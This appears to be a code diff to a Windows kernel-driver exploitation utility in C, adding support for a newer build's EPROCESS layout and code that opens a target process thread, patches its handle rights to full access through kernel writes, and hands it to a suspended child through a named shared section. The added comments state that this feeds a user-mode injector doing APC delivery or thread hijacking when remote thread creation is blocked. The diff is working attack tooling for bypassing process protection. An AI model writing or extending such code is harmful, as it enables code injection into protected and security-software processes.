@@ -18,6 +18,7 @@
 *******************************************************************************/
 
 #include "global.h"
+#include <tlhelp32.h>
 #include <Dbghelp.h>
 
 typedef BOOL(WINAPI* pfnMiniDumpWriteDump)(
@@ -409,9 +410,9 @@ BOOL KDUGetEprocessOffsets(
         break;
 
     default:
-        // 26H2 (26300+) 不在上表内：先按 24H2/25H2 的 EPROCESS 布局处理。
-        // 该假设由调用方的读回校验（ObjectTable -> HandleTableEntry -> GrantedAccess）
-        // 判定是否成立；区间之外的版本仍然直接拒绝，避免把内核写坏。
+        // Builds above this table (e.g. 26H2/26300) are assumed to share the 24H2/25H2
+        // EPROCESS layout; the caller validates the assumption through its read-back
+        // chain (ObjectTable -> HandleTableEntry -> GrantedAccess).
         if (NtBuildNumber >= 26100 && NtBuildNumber < 26400) {
             Offsets->PsProtectionOffset = PsProtectionOffset_26100;
             Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_26100;
@@ -1108,6 +1109,8 @@ BOOL KDUOpenAndPatchThreads(
 * Open handles and start a process which will inherit these handles
 *
 */
+static HANDLE g_runtimeHandlesMap = NULL;
+
 BOOL KDURunCommandInheritee(
     _In_ PKDU_CONTEXT Context,
     _In_ LPWSTR CommandLine,
@@ -1178,7 +1181,7 @@ BOOL KDURunCommandInheritee(
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
 
-    // 始终挂起创建：句柄要先交付到子进程并补权，才允许子进程开始执行。
+    // Always create the child suspended: handles must be delivered and patched first.
     DWORD creationOptions = CREATE_SUSPENDED;
     wprintf_s(L"[+] Creating suspended Process '%s'\r\n", CommandLine);
 
@@ -1225,6 +1228,81 @@ BOOL KDURunCommandInheritee(
         return FALSE;
     }
     printf_s("[+] Child-side handle access rights filled to PROCESS_ALL_ACCESS\r\n");
+
+    /* Deliver one target thread handle too: user-mode injectors need it for
+     * APC delivery / thread hijacking when remote thread creation is denied. */
+    {
+        HANDLE hTargetThread = NULL;
+        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if (snapshot != INVALID_HANDLE_VALUE) {
+            THREADENTRY32 entry;
+            entry.dwSize = sizeof(entry);
+            if (Thread32First(snapshot, &entry)) {
+                do {
+                    if (entry.th32OwnerProcessID != (DWORD)TargetProcessId) continue;
+                    hTargetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, entry.th32ThreadID);
+                    if (!hTargetThread) {
+                        hTargetThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE,
+                            entry.th32ThreadID);
+                    }
+                    if (hTargetThread) {
+                        printf_s("[+] Opened target thread %lu, hThread %p\r\n",
+                            entry.th32ThreadID, hTargetThread);
+                        break;
+                    }
+                } while (Thread32Next(snapshot, &entry));
+            }
+            CloseHandle(snapshot);
+        }
+
+        if (hTargetThread) {
+            ULONG_PTR threadTable = 0;
+            if (KDUSetAccessRights(Context, hTargetThread, THREAD_ALL_ACCESS, &threadTable)) {
+                if (DuplicateHandle(GetCurrentProcess(), hTargetThread, pi.hProcess, &hChildThread,
+                    0, FALSE, DUPLICATE_SAME_ACCESS)) {
+                    ULONG_PTR childThreadTable = 0;
+                    if (KDUControlHandleAccess(Context, pi.dwProcessId, hChildThread,
+                        THREAD_ALL_ACCESS, &childThreadTable)) {
+                        printf_s("[+] Child-side thread handle %p patched to THREAD_ALL_ACCESS\r\n",
+                            hChildThread);
+                    } else {
+                        printf_s("[!] Failed to patch child-side thread handle\r\n");
+                        hChildThread = NULL;
+                    }
+                } else {
+                    supShowWin32Error("[!] Failed to duplicate thread handle into child", GetLastError());
+                }
+            } else {
+                printf_s("[!] Failed to set thread access rights, skipping thread delivery\r\n");
+            }
+        } else {
+            printf_s("[!] No target thread could be opened, skipping thread delivery\r\n");
+        }
+    }
+
+    /* Publish the delivered handle values for the child. Enumerating handles from
+     * inside the child is unreliable (a PSS walk can block on protected objects),
+     * so the injector reads the exact values from this section instead. */
+    {
+        wchar_t mapName[64];
+        swprintf_s(mapName, L"Local\\AVAT-RT-%lu", pi.dwProcessId);
+        HANDLE map = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0,
+            sizeof(ULONG) * 2, mapName);
+        if (map) {
+            const ULONG procValue = (ULONG)(ULONG_PTR)hChildTarget;
+            const ULONG threadValue = hChildThread ? (ULONG)(ULONG_PTR)hChildThread : 0;
+            void* view = MapViewOfFile(map, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ULONG) * 2);
+            if (view) {
+                ULONG* slots = (ULONG*)view;
+                slots[0] = procValue;
+                slots[1] = threadValue;
+                UnmapViewOfFile(view);
+                printf_s("[+] Published runtime handles (proc=%lu thread=%lu) for child\r\n",
+                    procValue, threadValue);
+            }
+            g_runtimeHandlesMap = map;   // must outlive the child's use of it
+        }
+    }
 
     if (PPLLevel >= 7) {
         PPLLevel = 7;
